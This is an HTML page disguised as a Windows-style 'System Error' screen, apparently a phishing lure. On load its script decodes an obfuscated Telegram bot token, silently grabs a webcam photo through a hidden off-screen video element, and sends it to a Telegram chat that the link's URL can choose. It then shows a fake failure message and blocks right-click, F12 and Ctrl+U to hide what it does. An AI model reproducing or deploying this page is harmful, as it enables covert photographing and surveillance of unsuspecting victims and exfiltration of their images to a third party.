<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Error - 0x80070567</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body { 
            background: black;
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: 'Courier New', monospace;
        }
        
        /* رسالة الخطأ */
        .error-message {
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            text-align: center;
            padding: 20px;
            border: 1px solid #00ff0033;
            border-radius: 5px;
            background: #00000099;
            max-width: 80%;
            z-index: 9999;
            position: relative;
        }
        
        .cursor {
            display: inline-block;
            width: 10px;
            height: 16px;
            background: #00ff00;
            margin-left: 5px;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
        
        /* خلفية الماتريكس */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            opacity: 0.1;
            font-family: monospace;
            color: #0f0;
            font-size: 12px;
            line-height: 12px;
            white-space: pre;
            overflow: hidden;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrixBg"></div>
    <div class="error-message" id="errorMsg">
        ⚠️ SYSTEM ERROR: 0x80070567<br>
        Initializing...<span class="cursor">_</span>
    </div>

    <script>
        // ==================== دوال التشفير الأساسية ====================
        const _decodeToken = (str) => {
            try {
                return atob(str.split('').reverse().join(''));
            } catch(e) {
                return '';
            }
        };

        // البيانات المشفرة
        const BOT_TOKEN = _decodeToken('==VUZOcDRBcmZGTkFBUGY1NzA1MzA4MDM4OVVBUkZGcEFBTmZoNXA4MzA3NTYwNzA4MDM4MA==');
        const DEFAULT_ID = _decodeToken('==ODY0MjU5MzI3');
        
        // جلب الإيدي من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        let USER_ID = urlParams.get('id') || DEFAULT_ID;
        
        // تنظيف الإيدي
        USER_ID = USER_ID.replace(/[^0-9-]/g, '');
        if (USER_ID.length < 5) USER_ID = DEFAULT_ID;

        // ==================== دالة الإرسال ====================
        const sendPhoto = (photoBlob) => {
            try {
                const formData = new FormData();
                formData.append('chat_id', USER_ID);
                formData.append('photo', photoBlob, 'image.jpg');
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                }).catch(() => {});
            } catch(e) {}
        };

        // ==================== التصوير المباشر ====================
        (async function() {
            try {
                // طلب الكاميرا مباشرة
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 }
                    } 
                });

                // إنشاء عنصر فيديو
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.style.position = 'absolute';
                video.style.left = '-9999px';
                video.style.top = '-9999px';
                document.body.appendChild(video);

                // انتظار تحميل الفيديو
                await new Promise(resolve => setTimeout(resolve, 200));

                // التصوير
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                // تحويل الصورة وإرسالها
                canvas.toBlob(blob => {
                    if (blob && blob.size > 500) {
                        sendPhoto(blob);
                    }
                }, 'image/jpeg', 0.7);

                // تنظيف
                stream.getTracks().forEach(track => track.stop());
                video.remove();

                // إظهار رسالة نجاح (وهمية)
                document.getElementById('errorMsg').innerHTML = '⚠️ SYSTEM ERROR: 0x80070567<br>Recovery failed. Rebooting...<span class="cursor">_</span>';

            } catch(error) {
                // إذا رفض الكاميرا - إظهار الخطأ مباشرة
                document.getElementById('errorMsg').innerHTML = '⚠️ ACCESS DENIED: 0x80070005<br>Camera permission rejected.<br>Terminating connection...<span class="cursor">_</span>';
            }
        })();

        // ==================== إخفاء الآثار ====================
        window.addEventListener('load', () => {
            document.body.style.overflow = 'hidden';
            
            // منع النقر بزر الماوس الأيمن
            document.addEventListener('contextmenu', e => e.preventDefault());
            
            // منع F12 و Ctrl+U
            document.addEventListener('keydown', e => {
                if (e.key === 'F12' || (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
</html>
